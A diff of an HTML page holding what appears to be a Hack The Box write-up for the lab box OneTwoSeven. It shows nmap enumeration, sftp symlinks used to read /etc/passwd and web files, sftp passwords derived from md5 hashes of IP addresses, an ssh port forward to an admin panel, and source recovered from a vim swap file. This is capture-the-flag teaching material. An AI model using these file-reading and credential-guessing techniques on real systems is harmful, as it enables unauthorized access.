@@ -85,47 +85,41 @@
 
 <h2 id="quick-summary">Quick Summary</h2>
 <p><br> Hey guys today OneTwoSeven retired and here’s my write-up about it. It was a very special box and I enjoyed every part of it, especially the <code class="highlighter-rouge">apt</code> man in the middle attack part. Definitely one of my favorite boxes. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.133</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">onetwoseven.htb</code>. Let’s jump right in !
-<img src="/images/hackthebox/onetwoseven/0.png" alt=""></p>
+<br><img src="/images/hackthebox/onetwoseven/0.png" alt=""><br></p>
 <hr>
 
 <h2 id="nmap">Nmap</h2>
 <p><br> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
-<code class="highlighter-rouge">nmap -sV -sT -sC onetwoseven.htb</code>
-<img src="/images/hackthebox/onetwoseven/1.png" alt="">
+<br><code class="highlighter-rouge">nmap -sV -sT -sC onetwoseven.htb</code>
+<br><img src="/images/hackthebox/onetwoseven/1.png" alt=""><br>
 <br> Only <code class="highlighter-rouge">http</code> on port 80 and <code class="highlighter-rouge">ssh</code>.
 <br></p>
 <hr>
 
 <h2 id="web-enumeration">Web Enumeration</h2>
 <p><br> By going to <code class="highlighter-rouge">http://onetwoseven.htb</code> we see this nice website :
-<img src="/images/hackthebox/onetwoseven/2.png" alt="">
+<br><img src="/images/hackthebox/onetwoseven/2.png" alt=""><br>
 <br> There’s a sign-up button, and some other info :
-<img src="/images/hackthebox/onetwoseven/3.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/onetwoseven/4.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/onetwoseven/5.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/onetwoseven/6.png" alt="">
+<br><img src="/images/hackthebox/onetwoseven/3.png" alt=""><br>
+<br><img src="/images/hackthebox/onetwoseven/4.png" alt=""><br>
+<br><img src="/images/hackthebox/onetwoseven/5.png" alt=""><br>
+<br><img src="/images/hackthebox/onetwoseven/6.png" alt=""><br>
 <br> So now we know that <code class="highlighter-rouge">sftp</code> is running, and we also know that if we tried to bruteforce anything we’ll get banned. 
 <br> If we look at the navigation bar we can see 3 pages :
-<img src="/images/hackthebox/onetwoseven/7.png" alt="">
+<br><img src="/images/hackthebox/onetwoseven/7.png" alt=""><br>
 <br> Home is where we are, statistics just shows stuff like up-time, banned ip addresses etc.., there’s a page titled Admin and it’s disabled, let’s look at the <code class="highlighter-rouge">html</code> source :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        &lt;!-- Only enable link if access from trusted networks admin/20190212 --&gt;
-        &lt;!-- Added localhost admin/20190214 --&gt;
-		  &lt;li class="nav-item"&gt;&lt;a id="adminlink" class="nav-link disabled" href="http://onetwoseven.htb:60080/"&gt;Admin&lt;/a&gt;&lt;/li&gt;
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="c">&lt;!-- Only enable link if access from trusted networks admin/20190212 --&gt;</span>
+        <span class="c">&lt;!-- Added localhost admin/20190214 --&gt;</span>
+		  <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"nav-item"</span><span class="nt">&gt;&lt;a</span> <span class="na">id=</span><span class="s">"adminlink"</span> <span class="na">class=</span><span class="s">"nav-link disabled"</span> <span class="na">href=</span><span class="s">"http://onetwoseven.htb:60080/"</span><span class="nt">&gt;</span>Admin<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
 
 </code></pre></div></div>
 <p><br> Admin’s page is on port 60080 and it’s only accessible from <code class="highlighter-rouge">localhost</code>, so we can skip that for now.
 <br> I clicked on the sign-up button and got this page :
-<img src="/images/hackthebox/onetwoseven/8.png" alt="">
+<br><img src="/images/hackthebox/onetwoseven/8.png" alt=""><br>
 <br> We have credentials for <code class="highlighter-rouge">sftp</code> : <code class="highlighter-rouge">ots-5MWI1ZmI : f991b5fb</code>
 <br> and we also have a personal home page (http://onetwoseven.htb/~ots-5MWI1ZmI/) which looks like this :
-<img src="/images/hackthebox/onetwoseven/9.png" alt=""></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<br><img src="/images/hackthebox/onetwoseven/9.png" alt=""><br></p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
 <span class="nt">&lt;html&gt;</span>
 <span class="nt">&lt;head&gt;</span>
 <span class="nt">&lt;title&gt;</span>Nothing here.<span class="nt">&lt;/title&gt;</span>
@@ -159,9 +153,9 @@ sftp&gt;
 </code></pre></div></div>
 <p><br> You may wonder why we didn’t see an open port for <code class="highlighter-rouge">sftp</code>, that’s because <code class="highlighter-rouge">sftp</code> runs on top of <code class="highlighter-rouge">ssh</code> by default, check <a href="https://www.jscape.com/blog/what-port-does-sftp-use" target="_blank" rel="noopener noreferrer">this</a>.
 <br> I created a <code class="highlighter-rouge">php</code> test file and uploaded it :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
-echo 'test';
-?&gt;
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="s1">'test'</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
 </code></pre></div></div>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sftp&gt; put test.php
@@ -170,7 +164,7 @@ test.php                                                                        
 sftp&gt;  
 </code></pre></div></div>
 <p><br> Unfortunately it will respond with <code class="highlighter-rouge">403</code> to any uploaded <code class="highlighter-rouge">php</code> file :
-<img src="/images/hackthebox/onetwoseven/10.png" alt="">
+<br><img src="/images/hackthebox/onetwoseven/10.png" alt=""><br>
 <br> I checked the commands list of <code class="highlighter-rouge">sftp</code> and saw that I can create symlinks with <code class="highlighter-rouge">symlink</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sftp&gt; help
 Available commands:
@@ -217,7 +211,7 @@ drwxr-xr-x    3 0        0            4096 Aug 29 19:57 ..
 lrwxrwxrwx    1 1010     1010           11 Aug 29 20:14 passwd
 sftp&gt; 
 </code></pre></div></div>
-<p><img src="/images/hackthebox/onetwoseven/11.png" alt="">
+<p><br><img src="/images/hackthebox/onetwoseven/11.png" alt=""><br>
 <br> As you can see there’s a user with <code class="highlighter-rouge">localhost</code>’s ip, that can be helpful but we need to know his password, we already got the username : <code class="highlighter-rouge">ots-yODc2NGQ</code>.
 <br> I wanted to know how usernames were generated so I made some assumptions and tested them.
 <br> Usernames were following the same pattern which was <code class="highlighter-rouge">ots-</code> then a base-64 encoded string , I tried to decode the string from my username (<code class="highlighter-rouge">5MWI1ZmI</code>) but I got nothing readable, so I tried to encode my password (<code class="highlighter-rouge">f991b5fb</code>) :</p>
@@ -225,20 +219,20 @@ sftp&gt;
 Zjk5MWI1ZmIK
 </code></pre></div></div>
 <p><br> So the string in usernames is part of the base-64 encoded password, but how these password are generated in the first place ? my password looked like <code class="highlighter-rouge">hex</code> but after decoding it I got nothing readable so I guessed it might be a part of an <code class="highlighter-rouge">md5</code> hash, but what hash ? I tried the <code class="highlighter-rouge">md5</code> hash of my ip :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven# python
-Python 2.7.16 (default, Apr  6 2019, 01:42:57)
-[GCC 8.3.0] on linux2
-Type "help", "copyright", "credits" or "license" for more information.
-&gt;&gt;&gt; from hashlib import md5
-&gt;&gt;&gt; print md5("10.10.xx.xx").hexdigest()
-f991b5fbxxxxxxxxxxxxxxxxxxxxxxxx
-&gt;&gt;&gt;
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="nd">@kali</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">onetwoseven</span><span class="c"># python</span>
+<span class="n">Python</span> <span class="mf">2.7</span><span class="o">.</span><span class="mi">16</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">Apr</span>  <span class="mi">6</span> <span class="mi">2019</span><span class="p">,</span> <span class="mo">01</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">57</span><span class="p">)</span>
+<span class="p">[</span><span class="n">GCC</span> <span class="mf">8.3</span><span class="o">.</span><span class="mi">0</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux2</span>
+<span class="n">Type</span> <span class="s">"help"</span><span class="p">,</span> <span class="s">"copyright"</span><span class="p">,</span> <span class="s">"credits"</span> <span class="ow">or</span> <span class="s">"license"</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="o">.</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">md5</span><span class="p">(</span><span class="s">"10.10.xx.xx"</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+<span class="n">f991b5fbxxxxxxxxxxxxxxxxxxxxxxxx</span>
+<span class="o">&gt;&gt;&gt;</span>
 
 </code></pre></div></div>
 <p><br> So passwords are just the first 8 chars of the ip’s md5 hash, now we can generate the password for <code class="highlighter-rouge">ots-yODc2NGQ</code> based on the same idea :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; print md5("127.0.0.1").hexdigest()
-f528764d624db129b32c21fbca0cb8d6
-&gt;&gt;&gt; 
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">md5</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+<span class="n">f528764d624db129b32c21fbca0cb8d6</span>
+<span class="o">&gt;&gt;&gt;</span> 
 </code></pre></div></div>
 <p><br> <code class="highlighter-rouge">ots-yODc2NGQ : f528764d</code>  , let’s try it :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven# sftp ots-yODc2NGQ@onetwoseven.htb
@@ -254,7 +248,7 @@ Fetching /user.txt to user.txt
 /user.txt                                                                                                                                                                        100%   33     0.2KB/s   00:00    
 sftp&gt;
 </code></pre></div></div>
-<p><img src="/images/hackthebox/onetwoseven/12.png" alt="">
+<p><br><img src="/images/hackthebox/onetwoseven/12.png" alt=""><br>
 <br> We owned user.
 <br></p>
 <hr>
@@ -270,23 +264,21 @@ Connection to onetwoseven.htb closed.
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven# ssh -nNT -L 60080:127.0.0.1:60080 ots-yODc2NGQ@onetwoseven.htb
 ots-yODc2NGQ@onetwoseven.htb's password:
 </code></pre></div></div>
-<p><img src="/images/hackthebox/onetwoseven/13.png" alt="">
+<p><br><img src="/images/hackthebox/onetwoseven/13.png" alt=""><br>
 <br> We need credentials to login, I used the <code class="highlighter-rouge">symlink</code> command and created a symlink to <code class="highlighter-rouge">/var/www</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sftp&gt; symlink /var/www www
 sftp&gt; 
 </code></pre></div></div>
-<p><img src="/images/hackthebox/onetwoseven/14.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/onetwoseven/15.png" alt="">
+<p><br><img src="/images/hackthebox/onetwoseven/14.png" alt=""><br>
+<br><img src="/images/hackthebox/onetwoseven/15.png" alt=""><br>
 <br> I downloaded <code class="highlighter-rouge">login.php.swp</code> : 
-<img src="/images/hackthebox/onetwoseven/16.png" alt="">
+<br><img src="/images/hackthebox/onetwoseven/16.png" alt=""><br>
 <br> Because it’s a <code class="highlighter-rouge">vim</code> swap file it had a lot of unreadable characters so I used strings :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven# strings login.php.swp &gt; login.php
 root@kali:~/Desktop/HTB/boxes/onetwoseven#
 </code></pre></div></div>
 <p><br> <code class="highlighter-rouge">login.php</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>b0VIM 8.0
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>b0VIM 8.0
 u\k*
 root
 onetwoseven
@@ -295,7 +287,7 @@ utf-8
 3210
 #"! 
 	    <span class="nt">&lt;table&gt;</span>
-            <span class="nt">&lt;h4</span> <span class="na">class =</span><span class="err"> </span><span class="s">"form-signin-heading"</span><span class="nt">&gt;&lt;font</span> <span class="na">size=</span><span class="s">"-1"</span> <span class="na">color=</span><span class="s">"red"</span><span class="nt">&gt;</span><span class="cp">&lt;?php echo $msg; ?&gt;</span><span class="nt">&lt;/font&gt;&lt;/h4&gt;</span>
+            <span class="nt">&lt;h4</span> <span class="na">class =</span><span class="err"> </span><span class="s">"form-signin-heading"</span><span class="nt">&gt;&lt;font</span> <span class="na">size=</span><span class="s">"-1"</span> <span class="na">color=</span><span class="s">"red"</span><span class="nt">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$msg</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="nt">&lt;/font&gt;&lt;/h4&gt;</span>
          <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/login.php"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
       
       <span class="nt">&lt;div</span> <span class="na">class =</span><span class="err"> </span><span class="s">"container"</span><span class="nt">&gt;</span>
@@ -310,150 +302,140 @@ utf-8
             if (isset($_POST['login']) <span class="err">&amp;&amp;</span> !empty($_POST['username']) <span class="err">&amp;&amp;</span> !empty($_POST['password'])) {
             
             $msg = '';
-          <span class="cp">&lt;?php
-        &lt;h2 class="featurette-heading"&gt;Login to the kingdom.&lt;span class="text-muted"&gt; Up up and away!&lt;/span&gt;&lt;/h2&gt;
-      &lt;div class="col-md-12"&gt;
-    &lt;div class="row featurette"&gt;
+          <span class="cp">&lt;?php</span>
+        <span class="o">&lt;</span><span class="nx">h2</span> <span class="k">class</span><span class="err">="</span><span class="nc">featurette</span><span class="o">-</span><span class="nx">heading</span><span class="s2">"&gt;Login to the kingdom.&lt;span class="</span><span class="nx">text</span><span class="o">-</span><span class="nx">muted</span><span class="s2">"&gt; Up up and away!&lt;/span&gt;&lt;/h2&gt;
+      &lt;div class="</span><span class="nx">col</span><span class="o">-</span><span class="nx">md</span><span class="o">-</span><span class="mi">12</span><span class="s2">"&gt;
+    &lt;div class="</span><span class="nx">row</span> <span class="nx">featurette</span><span class="s2">"&gt;
     &lt;!-- START THE FEATURETTES --&gt;
-  &lt;div class="container marketing"&gt;
+  &lt;div class="</span><span class="nx">container</span> <span class="nx">marketing</span><span class="s2">"&gt;
   &lt;!-- Wrap the rest of the page in another container to center all the content. --&gt;
   ================================================== --&gt;
   &lt;!-- Marketing messaging and featurettes
   &lt;/div&gt;
     &lt;/a&gt;
-      &lt;span class="sr-only"&gt;Next&lt;/span&gt;
-      &lt;span class="carousel-control-next-icon" aria-hidden="true"&gt;&lt;/span&gt;
-    &lt;a class="carousel-control-next" href="#myCarousel" role="button" data-slide="next"&gt;
-    &lt;/a&gt;
-      &lt;span class="sr-only"&gt;Previous&lt;/span&gt;
-      &lt;span class="carousel-control-prev-icon" aria-hidden="true"&gt;&lt;/span&gt;
-    &lt;a class="carousel-control-prev" href="#myCarousel" role="button" data-slide="prev"&gt;
-    &lt;/div&gt;
-      &lt;/div&gt;
-        &lt;/div&gt;
-          &lt;/div&gt;
-            &lt;p&gt;Administration backend. For administrators only.&lt;/p&gt;
-            &lt;h1&gt;OneTwoSeven Administration&lt;/h1&gt;
-          &lt;div class="carousel-caption text-left"&gt;
-        &lt;div class="container"&gt;
-        &lt;img src="dist/img/ai-codes-coding-97077.jpg"&gt;
-      &lt;div class="carousel-item active"&gt;
-    &lt;div class="carousel-inner"&gt;
+      &lt;span class="</span><span class="nx">sr</span><span class="o">-</span><span class="nx">only</span><span class="s2">"&gt;Next&lt;/span&gt;
+      &lt;span class="</span><span class="nx">carousel</span><span class="o">-</span><span class="nx">control</span><span class="o">-</span><span class="nb">next</span><span class="o">-</span><span class="nx">icon</span><span class="s2">" aria-hidden="</span><span class="kc">true</span><span class="s2">"&gt;&lt;/span&gt;
+    &lt;a class="</span><span class="nx">carousel</span><span class="o">-</span><span class="nx">control</span><span class="o">-</span><span class="nb">next</span><span class="s2">" href="</span><span class="c1">#myCarousel" role="button" data-slide="next"&gt;
+</span>    <span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
+      <span class="o">&lt;</span><span class="nx">span</span> <span class="k">class</span><span class="err">="</span><span class="nc">sr</span><span class="o">-</span><span class="nx">only</span><span class="s2">"&gt;Previous&lt;/span&gt;
+      &lt;span class="</span><span class="nx">carousel</span><span class="o">-</span><span class="nx">control</span><span class="o">-</span><span class="nb">prev</span><span class="o">-</span><span class="nx">icon</span><span class="s2">" aria-hidden="</span><span class="kc">true</span><span class="s2">"&gt;&lt;/span&gt;
+    &lt;a class="</span><span class="nx">carousel</span><span class="o">-</span><span class="nx">control</span><span class="o">-</span><span class="nb">prev</span><span class="s2">" href="</span><span class="c1">#myCarousel" role="button" data-slide="prev"&gt;
+</span>    <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
+      <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
+        <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
+          <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
+            <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="nx">Administration</span> <span class="nx">backend</span><span class="o">.</span> <span class="nx">For</span> <span class="nx">administrators</span> <span class="nx">only</span><span class="o">.&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
+            <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">OneTwoSeven</span> <span class="nx">Administration</span><span class="o">&lt;/</span><span class="nx">h1</span><span class="o">&gt;</span>
+          <span class="o">&lt;</span><span class="nx">div</span> <span class="k">class</span><span class="err">="</span><span class="nc">carousel</span><span class="o">-</span><span class="nx">caption</span> <span class="nx">text</span><span class="o">-</span><span class="nx">left</span><span class="s2">"&gt;
+        &lt;div class="</span><span class="nx">container</span><span class="s2">"&gt;
+        &lt;img src="</span><span class="nx">dist</span><span class="o">/</span><span class="nx">img</span><span class="o">/</span><span class="nx">ai</span><span class="o">-</span><span class="nx">codes</span><span class="o">-</span><span class="nx">coding</span><span class="o">-</span><span class="mf">97077.</span><span class="nx">jpg</span><span class="s2">"&gt;
+      &lt;div class="</span><span class="nx">carousel</span><span class="o">-</span><span class="nx">item</span> <span class="nx">active</span><span class="s2">"&gt;
+    &lt;div class="</span><span class="nx">carousel</span><span class="o">-</span><span class="nx">inner</span><span class="s2">"&gt;
     &lt;/ol&gt;
-      &lt;li data-target="#myCarousel" data-slide-to="0" class="active"&gt;&lt;/li&gt;
-    &lt;ol class="carousel-indicators"&gt;
-  &lt;div id="myCarousel" class="carousel slide" data-ride="carousel"&gt;
-&lt;main role="main"&gt;
+      &lt;li data-target="</span><span class="c1">#myCarousel" data-slide-to="0" class="active"&gt;&lt;/li&gt;
+</span>    <span class="o">&lt;</span><span class="nx">ol</span> <span class="k">class</span><span class="err">="</span><span class="nc">carousel</span><span class="o">-</span><span class="nx">indicators</span><span class="s2">"&gt;
+  &lt;div id="</span><span class="nx">myCarousel</span><span class="s2">" class="</span><span class="nx">carousel</span> <span class="nx">slide</span><span class="s2">" data-ride="</span><span class="nx">carousel</span><span class="s2">"&gt;
+&lt;main role="</span><span class="nb">main</span><span class="s2">"&gt;
 &lt;/header&gt;
   &lt;/nav&gt;
     &lt;/div&gt;
-    &lt;div class="collapse navbar-collapse" id="navbarCollapse"&gt;
+    &lt;div class="</span><span class="nx">collapse</span> <span class="nx">navbar</span><span class="o">-</span><span class="nx">collapse</span><span class="s2">" id="</span><span class="nx">navbarCollapse</span><span class="s2">"&gt;
     &lt;/button&gt;
-      &lt;span class="navbar-toggler-icon"&gt;&lt;/span&gt;
-    &lt;button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation"&gt;
-    &lt;a class="navbar-brand" href="/login.php"&gt;OneTwoSeven - Administration Backend&lt;/a&gt;
-  &lt;nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark"&gt;
+      &lt;span class="</span><span class="nx">navbar</span><span class="o">-</span><span class="nx">toggler</span><span class="o">-</span><span class="nx">icon</span><span class="s2">"&gt;&lt;/span&gt;
+    &lt;button class="</span><span class="nx">navbar</span><span class="o">-</span><span class="nx">toggler</span><span class="s2">" type="</span><span class="nx">button</span><span class="s2">" data-toggle="</span><span class="nx">collapse</span><span class="s2">" data-target="</span><span class="c1">#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation"&gt;
+</span>    <span class="o">&lt;</span><span class="nx">a</span> <span class="k">class</span><span class="err">="</span><span class="nc">navbar</span><span class="o">-</span><span class="nx">brand</span><span class="s2">" href="</span><span class="o">/</span><span class="nx">login</span><span class="o">.</span><span class="nx">php</span><span class="s2">"&gt;OneTwoSeven - Administration Backend&lt;/a&gt;
+  &lt;nav class="</span><span class="nx">navbar</span> <span class="nx">navbar</span><span class="o">-</span><span class="nx">expand</span><span class="o">-</span><span class="nx">md</span> <span class="nx">navbar</span><span class="o">-</span><span class="nx">dark</span> <span class="nx">fixed</span><span class="o">-</span><span class="nx">top</span> <span class="nx">bg</span><span class="o">-</span><span class="nx">dark</span><span class="s2">"&gt;
     &lt;header&gt;
   &lt;body&gt;
   &lt;/head&gt;
-    &lt;link href="carousel.css" rel="stylesheet"&gt;
+    &lt;link href="</span><span class="nx">carousel</span><span class="o">.</span><span class="nx">css</span><span class="s2">" rel="</span><span class="nx">stylesheet</span><span class="s2">"&gt;
     &lt;!-- Custom styles for this template --&gt;
     &lt;/style&gt;
       @media (min-width: 768px) { .bd-placeholder-img-lg { font-size: 3.5rem; } }
       .bd-placeholder-img { font-size: 1.125rem; text-anchor: middle; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
     &lt;style&gt;
-    &lt;link href="/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous"&gt;
+    &lt;link href="</span><span class="o">/</span><span class="nx">dist</span><span class="o">/</span><span class="nx">css</span><span class="o">/</span><span class="nx">bootstrap</span><span class="o">.</span><span class="nb">min</span><span class="o">.</span><span class="nx">css</span><span class="s2">" rel="</span><span class="nx">stylesheet</span><span class="s2">" crossorigin="</span><span class="nx">anonymous</span><span class="s2">"&gt;
     &lt;!-- Bootstrap core CSS --&gt;
     &lt;title&gt;OneTwoSeven&lt;/title&gt;
-    &lt;meta name="generator" content="Jekyll v3.8.5"&gt;
-    &lt;meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors"&gt;
-    &lt;meta name="description" content=""&gt;
-    &lt;meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"&gt;
-    &lt;meta charset="utf-8"&gt;
+    &lt;meta name="</span><span class="nx">generator</span><span class="s2">" content="</span><span class="nx">Jekyll</span> <span class="nx">v3</span><span class="o">.</span><span class="mf">8.5</span><span class="s2">"&gt;
+    &lt;meta name="</span><span class="nx">author</span><span class="s2">" content="</span><span class="nx">Mark</span> <span class="nx">Otto</span><span class="p">,</span> <span class="nx">Jacob</span> <span class="nx">Thornton</span><span class="p">,</span> <span class="k">and</span> <span class="nx">Bootstrap</span> <span class="nx">contributors</span><span class="s2">"&gt;
+    &lt;meta name="</span><span class="nx">description</span><span class="s2">" content=""&gt;
+    &lt;meta name="</span><span class="nx">viewport</span><span class="s2">" content="</span><span class="nx">width</span><span class="o">=</span><span class="nx">device</span><span class="o">-</span><span class="nx">width</span><span class="p">,</span> <span class="nx">initial</span><span class="o">-</span><span class="nx">scale</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="nx">shrink</span><span class="o">-</span><span class="nx">to</span><span class="o">-</span><span class="nx">fit</span><span class="o">=</span><span class="nx">no</span><span class="s2">"&gt;
+    &lt;meta charset="</span><span class="nx">utf</span><span class="o">-</span><span class="mi">8</span><span class="s2">"&gt;
   &lt;head&gt;
-&lt;html lang="en"&gt;
+&lt;html lang="</span><span class="nx">en</span><span class="s2">"&gt;
 &lt;!doctype html&gt;
-&lt;?php session_start(); if (isset ($_SESSION['username'])) { header("Location: /menu.php"); } ?&gt;</span>
-<span class="cp">&lt;?php if ( $_SERVER['SERVER_PORT'] != 60080 ) { die(); } ?&gt;</span>
-<span class="nt">&lt;/html&gt;</span>
-      <span class="nt">&lt;script&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">jQuery</span> <span class="o">||</span> <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">'&lt;script src="/docs/4.3/assets/js/vendor/jquery-slim.min.js"&gt;&lt;</span><span class="err">\</span><span class="s1">/script&gt;'</span><span class="p">)</span><span class="nt">&lt;/script&gt;&lt;script </span><span class="na">src=</span><span class="s">"dist/js/bootstrap.bundle.min.js"</span> <span class="na">crossorigin=</span><span class="s">"anonymous"</span><span class="nt">&gt;&lt;/script&gt;&lt;/body&gt;</span>
-<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://code.jquery.com/jquery-3.3.1.slim.min.js"</span> <span class="na">integrity=</span><span class="s">"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"</span> <span class="na">crossorigin=</span><span class="s">"anonymous"</span><span class="nt">&gt;&lt;/script&gt;</span>
-<span class="nt">&lt;/main&gt;</span>
-  <span class="nt">&lt;/footer&gt;</span>
-    <span class="nt">&lt;p&gt;</span><span class="ni">&amp;copy;</span> 2019 OneTwoSeven, Dec. <span class="ni">&amp;middot;</span> <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Privacy<span class="nt">&lt;/a&gt;</span> <span class="ni">&amp;middot;</span> <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Terms<span class="nt">&lt;/a&gt;&lt;/p&gt;</span>
-    <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"float-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Back to top<span class="nt">&lt;/a&gt;&lt;/p&gt;</span>
-  <span class="nt">&lt;footer</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
-  <span class="c">&lt;!-- FOOTER --&gt;</span>
-  <span class="nt">&lt;/div&gt;</span><span class="c">&lt;!-- /.container --&gt;</span>
-    <span class="c">&lt;!-- /END THE FEATURETTES --&gt;</span>
-    <span class="nt">&lt;hr</span> <span class="na">class=</span><span class="s">"featurette-divider"</span><span class="nt">&gt;</span>
-    <span class="nt">&lt;/div&gt;</span>
-	     <span class="nt">&lt;/div&gt;</span>
-         <span class="nt">&lt;/form&gt;</span>
-            <span class="nt">&lt;/table&gt;</span>
-              <span class="nt">&lt;tr&gt;&lt;td</span> <span class="na">colspan=</span><span class="s">"2"</span><span class="nt">&gt;&lt;center&gt;&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">name=</span><span class="s">"login"</span><span class="nt">&gt;</span>Login<span class="nt">&lt;/button&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;</span>
-              <span class="nt">&lt;tr&gt;&lt;td&gt;&lt;b&gt;</span>Password:<span class="nt">&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">size=</span><span class="s">"40"</span> <span class="na">required</span><span class="nt">&gt;&lt;/td&gt;&lt;/tr&gt;</span>
-              <span class="nt">&lt;tr&gt;&lt;td&gt;&lt;b&gt;</span>Username:<span class="nt">&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">size=</span><span class="s">"40"</span> <span class="na">required</span> <span class="na">autofocus</span><span class="nt">&gt;&lt;/td&gt;&lt;/tr&gt;</span>
-	    <span class="nt">&lt;table&gt;</span>
-            <span class="nt">&lt;h4</span> <span class="na">class =</span><span class="err"> </span><span class="s">"form-signin-heading"</span><span class="nt">&gt;&lt;font</span> <span class="na">size=</span><span class="s">"-1"</span> <span class="na">color=</span><span class="s">"red"</span><span class="nt">&gt;</span><span class="cp">&lt;?php echo $msg; ?&gt;</span><span class="nt">&lt;/font&gt;&lt;/h4&gt;</span>
-         <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/login.php"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
+&lt;?php session_start(); if (isset (</span><span class="nv">$_SESSION['username']</span><span class="s2">)) { header("</span><span class="nx">Location</span><span class="o">:</span> <span class="o">/</span><span class="nx">menu</span><span class="o">.</span><span class="nx">php</span><span class="s2">"); } ?&gt;
+&lt;?php if ( </span><span class="nv">$_SERVER['SERVER_PORT']</span><span class="s2"> != 60080 ) { die(); } ?&gt;
+&lt;/html&gt;
